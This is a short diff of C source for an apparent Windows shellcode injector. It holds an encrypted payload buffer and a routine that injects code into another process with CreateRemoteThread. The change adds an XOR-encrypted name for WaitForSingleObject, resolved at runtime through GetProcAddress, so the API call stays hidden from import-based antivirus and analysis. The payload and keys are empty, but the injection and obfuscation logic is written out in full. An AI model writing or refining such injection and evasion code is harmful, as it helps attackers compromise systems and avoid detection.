@@ -13,11 +13,13 @@ unsigned char my_payload[] = { };
 // encrypted functions
 unsigned char s_vaex[] = { };
 unsigned char s_cth[] = { };
+unsigned char s_wfso[] = { };
 
 // length
 unsigned int my_payload_len = sizeof(my_payload);
 unsigned int s_vaex_len = sizeof(s_vaex);
 unsigned int s_cth_len = sizeof(s_cth);
+unsigned int s_wfso_len = sizeof(s_wfso);
 
 char my_payload_key[] = "";
 char f_key[] = "";
@@ -32,6 +34,7 @@ HANDLE (WINAPI * pCreateRemoteThread)(
   DWORD                  dwCreationFlags,
   LPDWORD                lpThreadId
 );
+DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
     int j;
@@ -92,7 +95,11 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
         hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
 
         if (hThread != NULL) {
-                WaitForSingleObject(hThread, 500);
+                // decrypt WaitForSingleObject function call
+                XOR((char *) s_wfso, s_wfso_len, f_key, sizeof(f_key));
+                pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
+                pWaitForSingleObject(hThread, 500);
+
                 CloseHandle(hThread);
                 return 0;
         }
